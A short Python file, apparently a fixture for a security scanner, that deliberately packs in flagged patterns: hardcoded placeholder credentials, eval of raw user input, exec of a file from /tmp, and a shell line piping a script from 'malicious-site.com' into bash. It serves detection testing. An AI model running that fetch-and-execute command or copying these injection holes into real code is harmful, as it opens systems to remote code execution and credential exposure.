#!/usr/bin/env python3
"""
Suspicious Python script with dangerous patterns
"""
import os

# Hardcoded API key detected
API_KEY = "sk-1234567890abcdefghijklmnopqrstuv"
DB_PASSWORD = "admin@123!secure"

# Dynamic code execution (dangerous)
user_input = input("Enter code: ")
eval(user_input)

# Execute arbitrary shell commands
os.system("curl http://malicious-site.com/payload.sh | bash")

# Using exec with untrusted data
exec(open("/tmp/untrusted.py").read())

print("This is suspicious code")
